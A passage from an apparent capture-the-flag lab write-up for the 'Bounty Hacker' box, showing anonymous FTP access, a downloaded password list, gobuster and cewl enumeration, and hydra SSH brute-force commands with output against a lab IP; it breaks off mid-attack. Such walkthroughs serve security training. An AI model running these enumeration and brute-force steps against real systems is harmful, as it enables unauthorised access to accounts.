Aggressive OS guesses: HP P2000 G3 NAS device (<span style=color:#ae81ff>91</span>%), Linux <span style=color:#ae81ff>2.6</span>.<span style=color:#ae81ff>32</span> (<span style=color:#ae81ff>89</span>%), Infomir MAG-<span style=color:#ae81ff>250</span> <span style=color:#66d9ef>set</span>-top box (<span style=color:#ae81ff>89</span>%), Ubiquiti AirMax NanoStation WAP (Linux <span style=color:#ae81ff>2.6</span>.<span style=color:#ae81ff>32</span>) (<span style=color:#ae81ff>89</span>%), Linux <span style=color:#ae81ff>3.7</span> (<span style=color:#ae81ff>89</span>%), Netgear RAIDiator <span style=color:#ae81ff>4.2</span>.<span style=color:#ae81ff>21</span> (Linux 
<span style=color:#ae81ff>2.6</span>.<span style=color:#ae81ff>37</span>) (<span style=color:#ae81ff>89</span>%), Linux <span style=color:#ae81ff>2.6</span>.<span style=color:#ae81ff>32</span> - <span style=color:#ae81ff>3.13</span> (<span style=color:#ae81ff>89</span>%), Linux <span style=color:#ae81ff>3.0</span> - <span style=color:#ae81ff>3.2</span> (<span style=color:#ae81ff>89</span>%), Linux <span style=color:#ae81ff>3.3</span> (<span style=color:#ae81ff>89</span>%), Linux <span style=color:#ae81ff>2.6</span>.<span style=color:#ae81ff>32</span> - <span style=color:#ae81ff>3.1</span> (<span style=color:#ae81ff>88</span>%)
No exact OS matches <span style=color:#66d9ef>for</span> host (test conditions non-ideal).
Network Distance: <span style=color:#ae81ff>5</span> hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (<span style=color:#66d9ef>using</span> port <span style=color:#ae81ff>41511</span>/tcp)
HOP RTT       ADDRESS
<span style=color:#ae81ff>1</span>   <span style=color:#ae81ff>63.06</span> ms  <span style=color:#ae81ff>10.17</span>.<span style=color:#ae81ff>0.1</span>
<span style=color:#ae81ff>2</span>   ... <span style=color:#ae81ff>4</span>
<span style=color:#ae81ff>5</span>   <span style=color:#ae81ff>238.98</span> ms <span style=color:#ae81ff>10.10</span>.<span style=color:#ae81ff>56.222</span>

OS and Service detection performed. Please report any incorrect results at https:<span style=color:#75715e>//nmap.org/submit/ .
</span><span style=color:#75715e></span>Nmap done: <span style=color:#ae81ff>1</span> IP address (<span style=color:#ae81ff>1</span> host up) scanned <span style=color:#66d9ef>in</span> <span style=color:#ae81ff>38.33</span> seconds
</code></pre></div><p>Alright, we can see three ports open. Let&rsquo;s enumerate the FTP (21) port first.</p><h3 id=ftp---port-21>FTP - Port (21)<a hidden class=anchor aria-hidden=true href=#ftp---port-21>#</a></h3><p>No exploits found for the version reported. Let&rsquo;s try anonymous login against the FTP port open.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span>(root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x)<span style=color:#f92672>-</span>[<span style=color:#f92672>/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Bounty Hacker]
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ</span><span style=color:#75715e># ftp 10.10.56.222 21  </span>
Connected to <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span><span style=color:#f92672>.</span>
<span style=color:#ae81ff>220</span> (vsFTPd <span style=color:#ae81ff>3.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>3</span>)
Name (<span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span>:root): anonymous
<span style=color:#ae81ff>230</span> Login successful<span style=color:#f92672>.</span>
Remote system type <span style=color:#f92672>is</span> UNIX<span style=color:#f92672>.</span>
Using binary mode to transfer files<span style=color:#f92672>.</span>
ftp<span style=color:#f92672>&gt;</span> dir
<span style=color:#ae81ff>200</span> PORT command successful<span style=color:#f92672>.</span> Consider using PASV<span style=color:#f92672>.</span>
<span style=color:#ae81ff>150</span> Here comes the directory listing<span style=color:#f92672>.</span>
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>    <span style=color:#ae81ff>1</span> ftp      ftp           <span style=color:#ae81ff>418</span> Jun <span style=color:#ae81ff>07</span>  <span style=color:#ae81ff>2020</span> locks<span style=color:#f92672>.</span>txt
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>    <span style=color:#ae81ff>1</span> ftp      ftp            <span style=color:#ae81ff>68</span> Jun <span style=color:#ae81ff>07</span>  <span style=color:#ae81ff>2020</span> task<span style=color:#f92672>.</span>txt
<span style=color:#ae81ff>226</span> Directory send OK<span style=color:#f92672>.</span>
ftp<span style=color:#f92672>&gt;</span> get locks<span style=color:#f92672>.</span>txt
local: locks<span style=color:#f92672>.</span>txt remote: locks<span style=color:#f92672>.</span>txt
<span style=color:#ae81ff>200</span> PORT command successful<span style=color:#f92672>.</span> Consider using PASV<span style=color:#f92672>.</span>
<span style=color:#ae81ff>150</span> Opening BINARY mode data connection <span style=color:#66d9ef>for</span> locks<span style=color:#f92672>.</span>txt (<span style=color:#ae81ff>418</span> bytes)<span style=color:#f92672>.</span>
<span style=color:#ae81ff>226</span> Transfer complete<span style=color:#f92672>.</span>
<span style=color:#ae81ff>418</span> bytes received <span style=color:#f92672>in</span> <span style=color:#ae81ff>0.08</span> secs (<span style=color:#ae81ff>5.2431</span> kB<span style=color:#f92672>/</span>s)
ftp<span style=color:#f92672>&gt;</span> get task<span style=color:#f92672>.</span>txt
local: task<span style=color:#f92672>.</span>txt remote: task<span style=color:#f92672>.</span>txt
<span style=color:#ae81ff>200</span> PORT command successful<span style=color:#f92672>.</span> Consider using PASV<span style=color:#f92672>.</span>
<span style=color:#ae81ff>150</span> Opening BINARY mode data connection <span style=color:#66d9ef>for</span> task<span style=color:#f92672>.</span>txt (<span style=color:#ae81ff>68</span> bytes)<span style=color:#f92672>.</span>
<span style=color:#ae81ff>226</span> Transfer complete<span style=color:#f92672>.</span>
<span style=color:#ae81ff>68</span> bytes received <span style=color:#f92672>in</span> <span style=color:#ae81ff>0.08</span> secs (<span style=color:#ae81ff>0.8768</span> kB<span style=color:#f92672>/</span>s)
ftp<span style=color:#f92672>&gt;</span>
</code></pre></div><p>Alright, <strong>anonymous login</strong> enabled on <strong>FTP</strong>. Downloaded two files present on it as well.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span>(root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x)<span style=color:#f92672>-</span>[<span style=color:#f92672>/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Bounty Hacker]
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ</span><span style=color:#75715e># cat locks.txt      </span>
rEddrAGON
ReDdr4g0nSynd<span style=color:#960050;background-color:#1e0010>!</span>cat3
Dr<span style=color:#a6e22e>@gOn</span><span style=color:#960050;background-color:#1e0010>$</span>yn9icat3
R3DDr46ONSYndIC<span style=color:#a6e22e>@Te</span>
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c<span style=color:#a6e22e>@T3</span>
Synd1c4teDr<span style=color:#a6e22e>@g0n</span>
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN<span style=color:#960050;background-color:#1e0010>$</span>yndIC<span style=color:#a6e22e>@t3</span>
<span style=color:#ae81ff>4L</span><span style=color:#ae81ff>1</span>mi6H71StHeB357
rEDdragOn<span style=color:#960050;background-color:#1e0010>$</span>ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n<span style=color:#960050;background-color:#1e0010>$</span>ynd1cate
Dr<span style=color:#a6e22e>@gOn</span><span style=color:#960050;background-color:#1e0010>$</span>yND1C4Te
RedDr<span style=color:#a6e22e>@gonSyn9ic47e</span>
REd<span style=color:#960050;background-color:#1e0010>$</span>yNdIc47e
dr<span style=color:#a6e22e>@goN5YNd1c@73</span>
rEDdrAGOnSyNDiCat3
r3ddr<span style=color:#a6e22e>@g0N</span>
ReDSynd1ca7e
                                                                                                                                                                                                                   
<span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span>(root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x)<span style=color:#f92672>-</span>[<span style=color:#f92672>/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Bounty Hacker]
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ</span><span style=color:#75715e># cat task.txt       </span>
<span style=color:#ae81ff>1.</span>) Protect Vicious<span style=color:#f92672>.</span>
<span style=color:#ae81ff>2.</span>) Plan <span style=color:#66d9ef>for</span> Red Eye pickup on the moon<span style=color:#f92672>.</span>

<span style=color:#f92672>-</span>lin
</code></pre></div><p>The first file includes passwords and the second some instructions? ‚Äî Let&rsquo;s pause this for now and move onto HTTP.</p><hr><h3 id=http---port-80>HTTP - Port (80)<a hidden class=anchor aria-hidden=true href=#http---port-80>#</a></h3><p>The site has many usernames in it, maybe we can use cewl to get all the usernames? and use the passwords above to bruteforcing SSH?</p><p><img loading=lazy src=/images/bounty_hacker-thm/Untitled.png alt></p><p>Let&rsquo;s bruteforce later. First, enumerate the local directories on the webserver using <strong>gobuster</strong>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span>(root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x)<span style=color:#f92672>-</span>[<span style=color:#f92672>/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Bounty Hacker]                                                             
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ</span><span style=color:#75715e># gobuster dir -u http://10.10.56.222 -w /usr/share/wordlists/dirb/common.txt -k -e -b 404 -t 100       </span>
<span style=color:#f92672>===============================================================</span>   
Gobuster v3<span style=color:#f92672>.</span><span style=color:#ae81ff>1.0</span>                                                                                          
by OJ Reeves (<span style=color:#a6e22e>@TheColonial</span>) <span style=color:#f92672>&amp;</span> Christian Mehlmauer (<span style=color:#a6e22e>@firefart</span>)                                            
<span style=color:#f92672>===============================================================</span>                                                                                                                                                    
[<span style=color:#f92672>+</span>] Url:                     http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span>                                                         
[<span style=color:#f92672>+</span>] Method:                  GET                                                                                                                                                                                   
[<span style=color:#f92672>+</span>] Threads:                 <span style=color:#ae81ff>100</span>                                                                         
[<span style=color:#f92672>+</span>] Wordlist:                <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>share<span style=color:#f92672>/</span>wordlists<span style=color:#f92672>/</span>dirb<span style=color:#f92672>/</span>common<span style=color:#f92672>.</span>txt                                        
[<span style=color:#f92672>+</span>] Negative Status codes:   <span style=color:#ae81ff>404</span>                                                                                                                                                                                   
[<span style=color:#f92672>+</span>] User Agent:              gobuster<span style=color:#f92672>/</span><span style=color:#ae81ff>3.1</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0</span>                                                              
[<span style=color:#f92672>+</span>] Expanded:                true                                                                        
[<span style=color:#f92672>+</span>] Timeout:                 <span style=color:#ae81ff>10</span>s                                                                         
<span style=color:#f92672>===============================================================</span>                                      
<span style=color:#ae81ff>2021</span><span style=color:#f92672>/</span><span style=color:#ae81ff>04</span><span style=color:#f92672>/</span><span style=color:#ae81ff>08</span> <span style=color:#ae81ff>23</span>:<span style=color:#ae81ff>59</span>:<span style=color:#ae81ff>34</span> Starting gobuster <span style=color:#f92672>in</span> directory enumeration mode
<span style=color:#f92672>===============================================================</span>                                          
http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span><span style=color:#f92672>/.</span>htaccess            (Status: <span style=color:#ae81ff>403</span>) [Size: <span style=color:#ae81ff>277</span>]                                       
http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span><span style=color:#f92672>/.</span>hta                 (Status: <span style=color:#ae81ff>403</span>) [Size: <span style=color:#ae81ff>277</span>]                                       
http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span><span style=color:#f92672>/.</span>htpasswd            (Status: <span style=color:#ae81ff>403</span>) [Size: <span style=color:#ae81ff>277</span>]
http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span><span style=color:#f92672>/</span>images               (Status: <span style=color:#ae81ff>301</span>) [Size: <span style=color:#ae81ff>313</span>] [<span style=color:#f92672>--&gt;</span> http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span><span style=color:#f92672>/</span>images<span style=color:#f92672>/</span>]     
http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span><span style=color:#f92672>/</span>index<span style=color:#f92672>.</span>html           (Status: <span style=color:#ae81ff>200</span>) [Size: <span style=color:#ae81ff>969</span>]                                       
http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span><span style=color:#f92672>/</span>server<span style=color:#f92672>-</span>status        (Status: <span style=color:#ae81ff>403</span>) [Size: <span style=color:#ae81ff>277</span>]                                                                                                                                                 
                                                                                                         
<span style=color:#f92672>===============================================================</span>                                          
<span style=color:#ae81ff>2021</span><span style=color:#f92672>/</span><span style=color:#ae81ff>04</span><span style=color:#f92672>/</span><span style=color:#ae81ff>08</span> <span style=color:#ae81ff>23</span>:<span style=color:#ae81ff>59</span>:<span style=color:#ae81ff>55</span> Finished                                                                             
<span style=color:#f92672>===============================================================</span>
</code></pre></div><p>Nothing interesting with <strong>common.txt</strong> wordlist and no extensions. Let&rsquo;s try with extensions maybe?</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span>(root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x)<span style=color:#f92672>-</span>[<span style=color:#f92672>/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Bounty Hacker]
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ</span><span style=color:#75715e># gobuster dir -u http://10.10.56.222 -w /usr/share/wordlists/dirb/common.txt -k -e -b 404,403 -t 100 -x php,jsp,rb,py,js,asp,aspx,zip,sql,tar,txt,key,doc,docx,html,jar,groovy,back,xml,ini,inc,config,json,yml,conf,cgi</span>
<span style=color:#f92672>===============================================================</span>
Gobuster v3<span style=color:#f92672>.</span><span style=color:#ae81ff>1.0</span>
by OJ Reeves (<span style=color:#a6e22e>@TheColonial</span>) <span style=color:#f92672>&amp;</span> Christian Mehlmauer (<span style=color:#a6e22e>@firefart</span>)
<span style=color:#f92672>===============================================================</span>
[<span style=color:#f92672>+</span>] Url:                     http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span>
[<span style=color:#f92672>+</span>] Method:                  GET
[<span style=color:#f92672>+</span>] Threads:                 <span style=color:#ae81ff>100</span>
[<span style=color:#f92672>+</span>] Wordlist:                <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>share<span style=color:#f92672>/</span>wordlists<span style=color:#f92672>/</span>dirb<span style=color:#f92672>/</span>common<span style=color:#f92672>.</span>txt
[<span style=color:#f92672>+</span>] Negative Status codes:   <span style=color:#ae81ff>403</span>,<span style=color:#ae81ff>404</span>
[<span style=color:#f92672>+</span>] User Agent:              gobuster<span style=color:#f92672>/</span><span style=color:#ae81ff>3.1</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0</span>
[<span style=color:#f92672>+</span>] Extensions:              js,zip,key,doc,docx,xml,cgi,jsp,py,jar,sql,groovy,inc,config,php,rb,asp,aspx,tar,txt,html,back,ini,json,yml,conf
[<span style=color:#f92672>+</span>] Expanded:                true
[<span style=color:#f92672>+</span>] Timeout:                 <span style=color:#ae81ff>10</span>s
<span style=color:#f92672>===============================================================</span>
<span style=color:#ae81ff>2021</span><span style=color:#f92672>/</span><span style=color:#ae81ff>04</span><span style=color:#f92672>/</span><span style=color:#ae81ff>09</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>20</span> Starting gobuster <span style=color:#f92672>in</span> directory enumeration mode
<span style=color:#f92672>===============================================================</span>
http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span><span style=color:#f92672>/</span>images               (Status: <span style=color:#ae81ff>301</span>) [Size: <span style=color:#ae81ff>313</span>] [<span style=color:#f92672>--&gt;</span> http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span><span style=color:#f92672>/</span>images<span style=color:#f92672>/</span>]
http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span><span style=color:#f92672>/</span>index<span style=color:#f92672>.</span>html           (Status: <span style=color:#ae81ff>200</span>) [Size: <span style=color:#ae81ff>969</span>]                                  
http:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span><span style=color:#f92672>/</span>index<span style=color:#f92672>.</span>html           (Status: <span style=color:#ae81ff>200</span>) [Size: <span style=color:#ae81ff>969</span>]                                  
                                                                                                    
<span style=color:#f92672>===============================================================</span>
<span style=color:#ae81ff>2021</span><span style=color:#f92672>/</span><span style=color:#ae81ff>04</span><span style=color:#f92672>/</span><span style=color:#ae81ff>09</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>05</span>:<span style=color:#ae81ff>33</span> Finished
<span style=color:#f92672>===============================================================</span>
</code></pre></div><blockquote><p>Nothing with that either, let&rsquo;s start another scan with <code>/usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt</code> and keep it running in the background and move with <strong>cewl</strong> against the site.</p></blockquote><p>Running cewl:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span>(root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x)<span style=color:#f92672>-</span>[<span style=color:#f92672>/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Bounty Hacker]
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ</span><span style=color:#75715e># cewl -k -d 10 -w potential-usernames.txt -a -e http://10.10.56.222                                                                                                                                         1 ‚®Ø</span>
CeWL <span style=color:#ae81ff>5.4</span><span style=color:#f92672>.</span><span style=color:#ae81ff>8</span> (Inclusion) Robin Wood (robin<span style=color:#a6e22e>@digi.ninja</span>) (https:<span style=color:#f92672>//</span>digi<span style=color:#f92672>.</span>ninja<span style=color:#f92672>/</span>)
</code></pre></div><p>The running arguments mean:</p><ul><li><code>-k, --keep</code>: Keep the downloaded file.</li><li><code>-d &lt;x>,--depth &lt;x></code>: Depth to spider to, default 2.</li><li><code>-w, --write</code>: Write the output to the file.</li><li><code>-a, --meta</code>: include meta data.</li><li><code>-e, --email</code>: Include email addresses.</li></ul><p>The argument <code>-e</code> wasn&rsquo;t required. Let&rsquo;s now try the list against SSH open on the host.</p><p>Alright, let&rsquo;s try all the things we&rsquo;ve in todo.</p><ul><li>Bruteforce using <code>cewl</code> list against <code>rocks.txt</code></li><li>Bruteforce using <code>rocks.txt</code> list against <code>rocks.txt</code></li></ul><blockquote><p>Bruteforce using <code>cewl</code> list against <code>rocks.txt</code></p></blockquote><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span>(root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x)<span style=color:#f92672>-</span>[<span style=color:#f92672>/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Bounty Hacker]                                                                                                                                                                       
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ</span><span style=color:#75715e># hydra -L potential-usernames.txt -P locks.txt 10.10.56.222 -s 22 ssh -vV</span>
Hydra v9<span style=color:#f92672>.</span><span style=color:#ae81ff>1</span> (c) <span style=color:#ae81ff>2020</span> by van Hauser<span style=color:#f92672>/</span>THC <span style=color:#f92672>&amp;</span> David Maciejak <span style=color:#f92672>-</span> Please do <span style=color:#f92672>not</span> use <span style=color:#f92672>in</span> military <span style=color:#f92672>or</span> secret service organizations, <span style=color:#f92672>or</span> <span style=color:#66d9ef>for</span> illegal purposes (this <span style=color:#f92672>is</span> non<span style=color:#f92672>-</span>binding, these <span style=color:#f92672>***</span> ignore laws <span style=color:#f92672>and</span> ethics anyway)<span style=color:#f92672>.</span>    
                                                                                                                                                                                                                   
Hydra (https:<span style=color:#f92672>//</span>github<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>vanhauser<span style=color:#f92672>-</span>thc<span style=color:#f92672>/</span>thc<span style=color:#f92672>-</span>hydra) starting at <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>21</span>:<span style=color:#ae81ff>23</span>                                                                                                                                 
[WARNING] Many SSH configurations limit the number of parallel tasks, it <span style=color:#f92672>is</span> recommended to reduce the tasks: use <span style=color:#f92672>-</span>t <span style=color:#ae81ff>4</span>                                                                                              
[DATA] max <span style=color:#ae81ff>16</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>16</span> tasks, <span style=color:#ae81ff>1898</span> login tries (l:<span style=color:#ae81ff>73</span><span style=color:#f92672>/</span>p:<span style=color:#ae81ff>26</span>), <span style=color:#f92672>~</span><span style=color:#ae81ff>119</span> tries per task                                                                                                              
[DATA] attacking ssh:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span>:<span style=color:#ae81ff>22</span><span style=color:#f92672>/</span>                                                                                                                                                                            
[VERBOSE] Resolving addresses <span style=color:#f92672>...</span> [VERBOSE] resolving done                                                                                                                                                         
[INFO] Testing <span style=color:#66d9ef>if</span> password authentication <span style=color:#f92672>is</span> supported by ssh:<span style=color:#f92672>//</span>you<span style=color:#a6e22e>@10.10.56.222</span>:<span style=color:#ae81ff>22</span>                                                                                                                                
[INFO] Successful, password authentication <span style=color:#f92672>is</span> supported by ssh:<span style=color:#f92672>//</span><span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span>:<span style=color:#ae81ff>22</span>                                                                                                                                   
[ATTEMPT] target <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span> <span style=color:#f92672>-</span> login <span style=color:#e6db74>&#34;you&#34;</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>pass</span> <span style=color:#e6db74>&#34;rEddrAGON&#34;</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1898</span> [child <span style=color:#ae81ff>0</span>] (<span style=color:#ae81ff>0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>0</span>)                                                                                                                         
[ATTEMPT] target <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span> <span style=color:#f92672>-</span> login <span style=color:#e6db74>&#34;you&#34;</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>pass</span> <span style=color:#e6db74>&#34;ReDdr4g0nSynd!cat3&#34;</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span> of <span style=color:#ae81ff>1898</span> [child <span style=color:#ae81ff>1</span>] (<span style=color:#ae81ff>0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>0</span>)                                                                                                                
[ATTEMPT] target <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span> <span style=color:#f92672>-</span> login <span style=color:#e6db74>&#34;you&#34;</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>pass</span> <span style=color:#e6db74>&#34;Dr@gOn$yn9icat3&#34;</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>3</span> of <span style=color:#ae81ff>1898</span> [child <span style=color:#ae81ff>2</span>] (<span style=color:#ae81ff>0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>0</span>)                                                                                                                   
[ATTEMPT] target <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span> <span style=color:#f92672>-</span> login <span style=color:#e6db74>&#34;you&#34;</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>pass</span> <span style=color:#e6db74>&#34;R3DDr46ONSYndIC@Te&#34;</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>4</span> of <span style=color:#ae81ff>1898</span> [child <span style=color:#ae81ff>3</span>] (<span style=color:#ae81ff>0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>0</span>)                                                                                                                
[ATTEMPT] target <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span> <span style=color:#f92672>-</span> login <span style=color:#e6db74>&#34;you&#34;</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>pass</span> <span style=color:#e6db74>&#34;ReddRA60N&#34;</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>5</span> of <span style=color:#ae81ff>1898</span> [child <span style=color:#ae81ff>4</span>] (<span style=color:#ae81ff>0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>0</span>)                                                                                                                         
[ATTEMPT] target <span style=color:#ae81ff>10.10</span><span style=color:#f92672>.</span><span style=color:#ae81ff>56.222</span> <span style=color:#f92672>-</span> login <span style=color:#e6db74>&#34;you&#34;</span> <span style=color:#f92672>-</span> <span style=color:#66d9ef>pass</span> <span style=color:#e6db74>&#34;R3dDrag0nSynd1c4te&#34;</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>6</span> of <span style=color:#ae81ff>1898</span> [child <span style=color:#ae81ff>5</span>] (<span style=color:#ae81ff>0</span><span style=color:#f92672>/</span><span style=color:#ae81ff>0</span>)
<span style=color:#f92672>...</span>
</code></pre></div><p>That didn&rsquo;t work, let&rsquo;s continue to the other combination of lists.</p><blockquote><p>Bruteforce using <code>rocks.txt</code> list against <code>rocks.txt</code></p></blockquote><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span>(root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x)<span style=color:#f92672>-</span>[<span style=color:#f92672>/</span>mnt<span style=color:#f92672>/</span>hgfs<span style=color:#f92672>/</span>THM<span style=color:#f92672>/</span>Bounty Hacker]                                                                                                                                                                       
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ</span><span style=color:#75715e># grc hydra -L locks.txt -P locks.txt 10.10.56.222 -s 22 ssh -vV -I                                                                                                                                              </span>
Hydra v9<span style=color:#f92672>.</span><span style=color:#ae81ff>1</span> (c) <span style=color:#ae81ff>2020</span> by van Hauser<span style=color:#f92672>/</span>THC <span style=color:#f92672>&amp;</span> David Maciejak <span style=color:#f92672>-</span> Please do <span style=color:#f92672>not</span> use <span style=color:#f92672>in</span> military <span style=color:#f92672>or</span> secret service organizations, <span style=color:#f92672>or</span> <span style=color:#66d9ef>for</span> illegal purposes (this <span style=color:#f92672>is</span> non<span style=color:#f92672>-</span>binding, these <span style=color:#f92672>***</span> ignore laws <span style=color:#f92672>and</span> ethics anyway)<span style=color:#f92672>.</span>    
                                                                                                                                                                                                                   
Hydra (https:<span style=color:#f92672>//</span>github<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>vanhauser<span style=color:#f92672>-</span>thc<span style=color:#f92672>/</span>thc<span style=color:#f92672>-</span>hydra) starting at <span style=color:#ae81ff>2021</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>21</span>:<span style=color:#ae81ff>54</span>                                                                                                                                 
[WARNING] Many SSH configurations limit the number of parallel tasks, it <span style=color:#f92672>is</span> recommended to reduce the tasks: use <span style=color:#f92672>-</span>t <span style=color:#ae81ff>4</span>                                                                                              
